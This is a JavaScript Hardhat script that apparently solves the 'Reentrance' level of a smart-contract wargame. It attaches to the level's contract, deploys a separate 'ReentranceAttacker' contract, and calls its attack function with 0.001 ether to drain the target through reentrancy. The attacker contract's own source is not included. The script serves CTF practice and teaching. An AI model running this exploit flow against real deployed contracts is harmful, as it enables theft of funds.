const {
    REENTRANCE_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink
} = require('./utils');

async function main(levelName = 'Reentrance') {
    logStartingLevel(levelName);

    if (!REENTRANCE_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, REENTRANCE_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("Reentrance");
    const contract = factory.attach(REENTRANCE_INSTANCE_ADDRESS);

    const attackerContractFactory = await ethers.getContractFactory("ReentranceAttacker");
    const attackerContract = await attackerContractFactory.deploy(contract.address);
    await attackerContract.deployed();

    const sentEther = ethers.utils.parseEther("0.001");

    const tx = await attackerContract.attack({value: sentEther});
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;